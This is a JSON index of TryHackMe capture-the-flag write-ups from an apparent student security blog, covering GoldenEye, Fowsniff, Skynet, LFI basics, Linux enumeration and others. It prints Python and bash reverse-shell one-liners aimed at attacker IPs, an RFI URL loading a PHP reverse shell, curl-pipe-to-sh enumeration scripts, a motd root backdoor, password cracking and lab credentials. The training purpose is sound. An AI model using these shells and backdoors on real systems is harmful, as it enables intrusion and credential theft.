\u0026gt;\u0026gt; secret.txt gpg --cipher-algo AES-256 --symmetric secret.txt gpg2john secret.txt.gpg \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65011712 for all loaded hashes Cost 2 (hash algorithm [...]) is 2 for all loaded hashes Cost 3 (cipher algorithm [...]) is 9 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status password (?) 1g 0:00:00:00 DONE (2020-12-15 04:17) 1.785g/s 7.142p/s 7.142c/s 7.142C/s 123456789..password Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Find an encrypted file called personal.txt.gpg and find a wordlist called data.txt.\nUse tac to reverse the wordlist before brute-forcing it against the encrypted file.\nWhat is the the password to the encrypted file?\n1 2 3 4 5 6 7 8 9  type f -name personal.txt.gpg 2\u0026gt;\u0026gt;/dev/null /home/sarah/oldLogs/units/personal.txt.gpg find / -type f -name data.txt 2\u0026gt;\u0026gt;/dev/null /home/sarah/logs/zmn/old stuff/-mvLp/data.txt tac \u0026#34;/home/sarah/logs/zmn/old stuff/-mvLp/data.txt\u0026#34; \u0026gt; reverse.txt python3 -m http.server 8080    In the browser on your machine navigate to: {MACHINE IP}:8080/  \n Download personal.txt.gpg and reverse.txt  1 2 3 4 5 6 7 8 9 10 11 12 13 14  gpg2john personal.txt.gpg \u0026gt; hash john --wordlist=reverse.txt --format=gpg hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65011712 for all loaded hashes Cost 2 (hash algorithm [...]) is 2 for all loaded hashes Cost 3 (cipher algorithm [...]) is 9 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status valamanezivonia (?) 1g 0:00:02:34 DONE (2020-12-15 04:59) 0.006485g/s 7.796p/s 7.796c/s 7.796C/s vigliacca..valamanezivonia Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   What is written in this now decrypted file?\n1  gpg --decrypt personal.txt.gpg   \nReading SQL databases Useful commands:\n1 2  service mysql start/stop mysql -u [username] -p -h [host ip]   Open SQL database file locally:\n1 2  mysql -u [username] -p source [sql filename]   Displaying the databases:\n1  SHOW DATABASES;   Choosing a database to view:\n1  USE [database name]   Displaying the tables in the selected database:\n1  SHOW TABLES;   View the table structure of individual table:\n1  DESCRIBE [table name]   Displaying all the data stored in a specific table:\n1  SELECT * FROM [table name]   Find a file called employees.sql and read the SQL database.\nFind the flag contained in one of the tables.\nWhat is the flag?\n1 2 3 4 5 6 7 8 9  find / -type f -name employees.sql 2\u0026gt;\u0026gt;/dev/null /home/sarah/serverLx/employees.sql cd \u0026#34;/home/sarah/serverLx/\u0026#34; mysql -u sarah -p sarah:password source employees.sql    HINT: Look for someone with the first name of: Lobel  1  SELECT * FROM employees WHERE first_name=\u0026#39;Lobel\u0026#39;;   \nFinal Challenge Go to the /home/shared/chatlogs directory and read the first chat log named: LpnQ.\nUse this to help you to proceed to the next task.\nNext chatlog:\n\nAnother one:\n\nWhat is Sameer\u0026rsquo;s SSH password?\n (screenshots of the three found chatlogs)\nWhat is the password for the sql database back-up copy?\n1 2 3 4 5  cd /home/shared/sql/conf/ find . -type f -size 50M ./JKpN less JKpN   \n1 2  cat pLmjwi LmqAQl Ulpsmt \u0026gt; passwords python3 -m http.server 8080   Download passwords file.\nUse less to view the file and search for words starting with \u0026lsquo;ebq\u0026rsquo;.\nTry different one to see which one is the correct one for the sql database.\n\nFind the SSH password of the user James.\nWhat is the password?\n1  cd /home/shared/sql   \n1 2  gpg --decrypt 2020-08-13.zip.gpg \u0026gt; backup.zip unzip backup.zip   \nSSH as james and change the user to root.\nWhat is the root flag?\n\n","description":"Guided room for beginners to learn/reinforce linux command line skills.","id":31,"section":"posts","tags":["command line","hash cracking","decoding","gpg","sql","privilege escalation"],"title":"Linux Strength Training [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/linux-strength-training/"},{"content":"   Title Anthem     Info Exploit a Windows machine in this beginner level challenge.   Difficulty Easy    Website Analysis Let\u0026rsquo;s run nmap and check what ports are open.\nWhat port is for the web server?\n\nWhat port is for remote desktop service?\n\nWhat is a possible password in one of the pages web crawlers check for?\n\nWhat CMS is the website using?\n\nWhat is the domain of the website?\n\nWhat\u0026rsquo;s the name of the Administrator?\n\n\nCan we find find the email address of the administrator?\n\nSpot the Flags What is flag 1?\n\nWhat is flag 2?\n\nWhat is flag 3?\n\nWhat is flag 4?\n\nFinal Stage Let\u0026rsquo;s get into the box using the intel we gathered.\nLet\u0026rsquo;s figure out the username and password to log in to the box.\n SH:UmbracoIsTheBest!\n Gain initial access to the machine, what is the contents of user.txt?\n\nCan we spot the admin password?\n\n\n\n\nEscalate your privileges to root, what is the contents of root.txt?\n\n","description":"Exploit a Windows machine in this beginner level challenge.","id":32,"section":"posts","tags":["enumeration","cms"],"title":"Anthem [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/anthem/"},{"content":"   Title Ignite     Info A new start-up has a few issues with their web server.   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap \nReconnaissance \n\nGaining Access fuelCMS Exploitation \n\n\n\n\nPrivilege Escalation \n\n\n\n","description":"A new start-up has a few issues with their web server.","id":33,"section":"posts","tags":["enumeration","cms","privilege escalation"],"title":"Ignite [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/ignite/"},{"content":"   Title GoldenEye     Info Bond, James Bond. A guided CTF.   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap Use nmap to scan the network for all ports.\nHow many ports are open?\n\nWebsite Take a look on the website, take a dive into the source code too and remember to inspect all scripts!\nWho needs to make sure they update their default password?\n\nPressing F12 in the Firefox broswer we can access Developer Tools.\n\nWhats their password?\n\nNow go use those credentials and login to a part of the site.\n boris:InvincibleHack3rInvincibleHack3r\n \n\nPOP3 Take a look at some of the other services you found using your nmap scan.\nAre the credentials you have re-usable?\n\nIf those creds don\u0026rsquo;t seem to work, can you use another program to find other users and passwords?\nMaybe Hydra? Whats their new password?\n  natalya:bird\n   boris:secret1!\n Inspect port 55007, what services is configured to use this port?\n POP3 is running on port 55007.\nWe can connect to the service using telnet\n Login using that service and the credentials you found earlier.\nWhat can you find on this service?\n emails\n What user can break Boris' codes?\n natalya\n Telnet Using the users you found on this service, find other users passwords.\n\n\nKeep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.\nGaining Access If you remembered in some of the emails you discovered, there is the severnaya-station.com website.\nTo get this working, you need up update your DNS records to reveal it.\nOn Linux edit your \u0026ldquo;/etc/hosts\u0026rdquo; file and add:\nsevernaya-station.com\nOn Windows do the same but in the \u0026ldquo;c:\\Windows\\System32\\Drivers\\etc\\hosts\u0026rdquo; file\nOnce you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir\nTry using the credentials you found earlier.\nWhich user can you login as?\n  xenia:RCP90rulez!\n Have a poke around the site.\nWhat other user can you find?\n\nWhat was this users password?\n\n doak:goat\n Use this users credentials to go through all the services you have found to reveal more emails.\nWhat is the next user you can find from doak?\nWhat is this users password?\n\nTake a look at their files on the moodle (severnaya-station.com)\n\nDownload the attachments and see if there are any hidden messages inside them?\n\n\n\n admin:xWinter1995x!\n Using the information you found in the last task, login with the newly found user.\n\nReverse Shell As this user has more site privileges, you are able to edit the moodles settings.\nFrom here get a reverse shell using python and netcat.\nTake a look into Aspell, the spell checker plugin.\nSettings-\u0026gt;Aspell-\u0026gt;Path to aspell\n\nPython shell:\n1 2 3  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;10.9.140.180\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;    Navigation \u0026gt; My profile \u0026gt; Blogs \u0026gt; Add a new entry\nclik on the “Toggle spell checker”\n\nPrivilege Escalation Download the linuxprivchecker to enumerate installed development tools.\nhttps://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123\nTo get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet.\nFollow the steps to get a file onto your VM:\nDownload the linuxprivchecker file locally\nNavigate to the file on your file system\n1 2  python -m SimpleHTTPServer 1337 wget \u0026lt;your IP\u0026gt;/\u0026lt;file\u0026gt;.py   \n\nWhats the kernel version?\n\nThis machine is vulnerable to the overlayfs exploit.\nThe exploitation is technically very simple:\n Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags. Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory. Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem. Make su on overlayfs world writable without changing the owner Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit. Execute the modified su binary You can download the exploit from here: https://www.exploit-db.com/exploits/37292  \n\n\nFix the exploit to work with the system you\u0026rsquo;re trying to exploit.\nRemember, enumeration is your key!\nWhat development tools are installed on the machine?\nwhich cc\n/usr/bin/cc\n\n\n\nRoot Flag \n\n","description":"Bond, James Bond. A guided CTF.","id":34,"section":"posts","tags":["enumeration","decoding","telnet","pop3","brute force","python","exploitation","privilege escalation"],"title":"GoldenEye [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/goldeneye/"},{"content":"   Title LFI Basics     Info Learn the basics of local file inclusion   Difficulty N\\A    Local File Inclusion LFI is a vulnerability which an attacker can exploit to include/read files.\nThis vulnerability occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.\nPossible impact:\n Denial of service Remote code execution Sensitive information disclosure  \n\n\n\nPiece of vulnerable code:\n1  $local_file = $_REQUEST[\u0026#34;page\u0026#34;];   LFI using Directory Traversal Directory traversal or Path Traversal is an HTTP attack which allows attackers to access restricted directories and execute commands outside of the web server’s root directory or other paths.\n\nPiece of vulnerable code:\n1  $local_file = \u0026#34;html/\u0026#34;.$_REQUEST[\u0026#34;page\u0026#34;];   RCE using LFI and log poisoning Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability.\nTo make it work an attacker attempts to inject malicious input to the server log.\nApache log file with ability to use log poisoning:\n\nTry reading the apache log file:\n\n\nIntercept the request and insert the following malicious code in the user agent field.\nThe PHP command will allow us to execute system commands by parsing the input to a GET parameter called lfi:\n\nForward the request and add your parameter to the link.\nThe link becomes: http:///lfi/lfi.php?page=/var/log/apache2/access.log\u0026amp;lfi=\nExecute commands on the system.\nCollection of information regarding LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion\n","description":"Learn the basics of local file inclusion","id":35,"section":"posts","tags":["lfi","log poisoning"],"title":"LFI Basics [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/lfi-basics/"},{"content":"   Title Fowsniff CTF     Info Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap Using nmap, scan this machine. What ports are open?\nUsing the information from the open ports. Look around. What can you find?\n\nPOP3 Using Google, can you find any public information about them?\nhttps://pastebin.com/NrAqVeeX\n\nCan you decode these md5 hashes?\n\n\n\nUsing the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?\n\n\n\n\n\n. . .\n\nOr we can use Hydra\n\nWhat was seina\u0026rsquo;s password to the email service?\n seina:scoobydoo2\n Can you connect to the pop3 service with her credentials? What email information can you gather?\n\nLooking through her emails, what was a temporary password set for her?\n\n\n. . .\n\nGaining Access In the email, who send it?\nUsing the password from the previous question and the senders username, connect to the machine using SSH.\n\n\nOnce connected, what groups does this user belong to? Are there any interesting files that can be run by that group?\n\n\nPrivilege Escalation Banner Exploitation Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?\nPython Reverse Shell:\n1  python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026lt;IP\u0026gt;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp).\nLook in /etc/update-motd.d/ file.\nIf (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!\n\nStart a netcat listener (nc -lvp 1234) and then re-login to the SSH service.\nYou will then receive a reverse shell on your netcat session as root!\n\n","description":"Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!","id":36,"section":"posts","tags":["enumeration","exploitation","pop3","brute force","python","metasploit"],"title":"Fowsniff CTF [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/fowsniff-ctf/"},{"content":"   Title Skynet     Info A vulnerable Terminator themed Linux machine.   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap \n\nDirectory Brute-Forcing \n\nSamba \n\n\n\n\nAccessing Webmail \n\n\nFurther Enumeration \n\n\n\nGaining Access Cuppa CMS Exploitation \n\nhttps://www.exploit-db.com/exploits/25971\n http://10.10.201.252/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.140.180:8888/php-reverse-shell.php\n \n\nPrivilege Escalation \n\n https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/\n \n\n\n\n\n","description":"A vulnerable Terminator themed Linux machine.","id":37,"section":"posts","tags":["enumeration","smb","cms","cron"],"title":"Skynet [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/skynet/"},{"content":"   Title Brute It     Info Learn how to brute, hash cracking and escalate privileges in this box!   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap \nDirectory Brute-Forcing \n\nNote found in the source code.\n\nBrute-Forcing SSH credentials \n\n\nSave RSA PRIVATE KEY into admin_id_rsa file and convert it for john.\nThen crack the passphrase.\n\n\nGaining Access User flag \nPrivilege Escalation \nUser John is able to run cat command as root.\nRead shadow file and crack the root\u0026rsquo;s password with john on your local machine.\n\n\nRoot flag \n","description":"Learn how to brute, hash cracking and escalate privileges in this box!","id":38,"section":"posts","tags":["brute force","hash cracking","privilege escalation"],"title":"Brute It [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/brute-it/"},{"content":"   Title Linux Local Enumeration     Info Learn to efficiently enumerate a linux machine and identify possible weaknesses.   Difficulty N\\A    Lab Setup  Upload PHP reverse shell on {MACHINE IP}:3000 Start netcat listener: nc -lnvp 1234  \n Execute: bash -c \u0026lsquo;bash -i \u0026gt;\u0026amp; /dev/tcp/{LOCAL MACHINE IP}/1234 0\u0026gt;\u0026amp;1\u0026rsquo; Now we have a shell:  \nStabilizing the shell TTY 1  python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   List of static binaries you can get on the system:\nhttps://github.com/andrew-d/static-binaries\nUpgrading to TTY:\nhttps://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys\nHow would you execute /bin/bash with perl?\n perl -e \u0026lsquo;exec \u0026ldquo;/bin/bash\u0026rdquo;;\u0026rsquo;\n SSH  In case if the tagert machine does not have a generated id_rsa file (or we don\u0026rsquo;t have reading permissions for it), we can still gain stable ssh access. We need to generate our own id_rsa key on our system and include an associated key into authorized_keys file on the target machine. Execute ssh-keygen and we should see id_rsa and id_rsa.pub files appear in our own .ssh folder. Copy the content of the id_rsa.pub file and put it inside the authorized_key file on the target machine. Now we can connect to the target machine using your id_rsa file.  Where can you usually find the id_rsa file?\n /home/user/.ssh/id_rsa\n Basic enumaration How would you print machine hardware name only?\n uname -m\n Where can you find bash history?\n ~/.bash_history\n https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-History-Facilities\nWhat\u0026rsquo;s the flag?\n\n/etc Central location for all your configuration files.\nRead the /etc/passwd file by running cat /etc/passwd\n goldfish: x:1003:1003:,,,:/home/goldfish:/bin/bash\n    Value Meaning     (goldfish) - Username    (x) - Password: Character \u0026ldquo;x\u0026rdquo; indicates that an encrypted account password is stored in /etc/shadow file   (1003) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.   (1003) - Group ID (GID): Linux group ID   (,,,) - User ID Info: A field that contains additional info (,,, means any user additional info)   (/home/goldfish) - Home directory: A path to user\u0026rsquo;s home directory that contains all the files related to them.   (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Services run on /usr/sbin/nologin.    If we have writing access to the /etc/passwd, we can easily get root creating a custom entry with root privelege:\rhttps://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/\rUse /etc/shadow to retrieve different user passwords:\n goldfish:$6$1FiLdnFwTwNWAqYN$WAdBGfhpwSA4y5CHGO0F2eeJpfMJAMWf6MHg7pHGaHKmrkeYdVN7fD.AQ9nptLkN7JYvJyQrfMcfmCHK34S.a/:18483:0:99999:7:::\n    Value Meaning     (goldfish) - Username    ($6$1FiLdnFwT\u0026hellip;) - Password: Encrypted password.   (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.   (0) - Minimum: The min number of days required between pass changes (Zero: pass can be changed immidiately).   (99999) - Maximum: The maximum number of days the password is valid.   (7) - Warn: The number of days before the user will be warned about changing their password.    If we have reading permissions for this file, we can crack the encrypted password using one of the cracking methods. Important files Find command and interesting files\nWhat\u0026rsquo;s the password you found?\n\nDid you find a flag?\nfind / -type f -name \u0026ldquo;*.conf\u0026rdquo; 2\u0026gt;/dev/null\n\nSUID Find all SUID file by executing this simple find command:\n1  find / -perm -u=s -type f 2\u0026gt;/dev/null   -u=s searches files that are owned by the root user\n-type f search for files, not directories\nWhich SUID binary has a way to escalate your privileges on the box?\n\nWhat\u0026rsquo;s the payload you can use to read /etc/shadow with this SUID?\n grep /etc/shadow\nhttps://gtfobins.github.io/gtfobins/grep/#suid\n Enumeration scripts Linpeas  Linux local Privilege Escalation Awesome Script is a script that searches for possible paths to escalate privileges on Linux/ hosts. It automatically searches for passwords, SUID files and Sudo right abuse to hint you on your way towards root.  Local Machine:\r```bash\rwget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh\rpython3 -m http.server 8000\r```\rTarget Machine:\n1  curl {OUR MACHINE IP}:8000/linpeas.sh | sh   LinEnum  It performs Scripted Local Linux Enumeration \u0026amp; Privilege Escalation Checks  Local Machine:\r```bash\rwget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\rpython3 -m http.server 8000\r```\rTarget Machine:\n1  curl {OUR MACHINE IP}:8000/LinEnum.sh | sh   ","description":"Learn to efficiently enumerate a linux machine and identify possible weaknesses.","id":39,"section":"posts","tags":["enumaration","shell stabilization","enumeration scripts"],"title":"Linux Local Enumeration [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/linux-local-enumeration/"},{"content":"   Title Startup     Info Abuse traditional vulnerabilities via untraditional means.   Difficulty Easy    Reconnaissance \nScanning \u0026amp; Enumeration Nmap \nFTP \nDirectory Brute-Forcing \n\n\nGaining Access \n\n\n\n\n\n\n\n\n\n\nPrivilege Escalation \n\n\n\n\n\n\n","description":"Abuse traditional vulnerabilities via untraditional means.","id":40,"section":"posts","tags":["enumeration","ftp","cron","privilege escalation"],"title":"Startup [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/startup/"},{"content":"   Title Sudo Security Bypass     Info A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series.   Difficulty N\\A    Security Bypass CVE-2019-14287\n It is a vulnerability found in the Unix Sudo program. This exploit has been fixed, but may still be present in older versions of Sudo (versions \u0026lt; 1.8.28). Manually choose to execute sudo as another user: sudo -u#  sudo can be configured by editing a configuration file called /etc/sudoers Safely edit with the command sudo visudo, which checks when you\u0026rsquo;re saving to ensure that there are no misconfigurations\n   ALL=(ALL:!root) NOPASSWD: ALL\n  Added in the sudoers file, granting user extra permision but not executing as root.\n  If you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (root).\n  Execute a command as root, despite being explicitly prevented from doing so.\n  This will only works if you\u0026rsquo;ve been granted non-root sudo permissions for the command.\n   What command are you allowed to run with sudo?\n\nWhat is the flag in /root/root.txt?\n\n ","description":"A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series.","id":41,"section":"posts","tags":["exploit"],"title":"Sudo Security Bypass [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/sudo-security-bypass/"},{"content":"Hi, I am Martin. I am a Computer Science student from Slovakia pursuing master\u0026rsquo;s degree at Slovak University of Technology in Bratislava. My main interest is in the Penetration Testing, Cyber Defense, Open-Source Intelligence Techniques and Social Engineering.\nIn my spare time, I make the Internet a safer place by reporting application and system vulnerabilities to local and foreign companies.\nThrough this website, I help other self-studying cyber security students in developing methodology used in basic penetration testing and vulnerability assessment.\nApart from cyber security, I have been writing my own songs since 2013. Beside that I like to listen to music, read books and also, I like cycling.\nThank you for visiting my page. I hope you like the content. Martin Kubecka\nCertifications \n\nCVEs CVE-2021-37413 Authentication Bypass in CMS provided by GRANDCOM, s.r.o.\n https://github.com/martinkubecka/CVE-References/blob/main/CVE-2021-37413.md https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37413 (Not publicly disclosed)  Training \u0026amp; Challenges SOC Analyst 1 Elite SOC Analyst 1 Battle Path by Rangeforce is a cloud-based cyber range focused on gaining live-environment experience with the foundational concepts and practices of a security operations center (SOC). Curriculum modules focus on email analysis, Linux and Windows logging, Splunk basics, alerts and visualization, YARA rules generation and writing, Suricata rules and management and other cybersecurity related challenges.\nAfter completing training exercises and different challenges for the SOC Analyst 1 Battle Path I successfully completed the capstone challenge, and then I was awarded SOC Analyst 1 Elite badge.\n Community SOC Challenge Community SOC Challenge by Rangeforce took place between May 14, 2021 and May 31, 2021. Solving Email Challenge focused on finding security threats associated with phishing, spoofing, malware, and linking analysis in the cyber range, I was awarded Community SOC Challenge badge.\n Persistence Challenge Persistence Challenge by Rangeforce was available from July 21st to August 8th, 2021. Participants first had to find a malicious remote IP address that was leveraging a persistence mechanism. Then identify and respond to the compromised user account. Finally, find and respond to an advanced persistence mechanism.\n","description":"","id":42,"section":"","tags":null,"title":"About","uri":"https://martinkubecka.github.io/about/"}]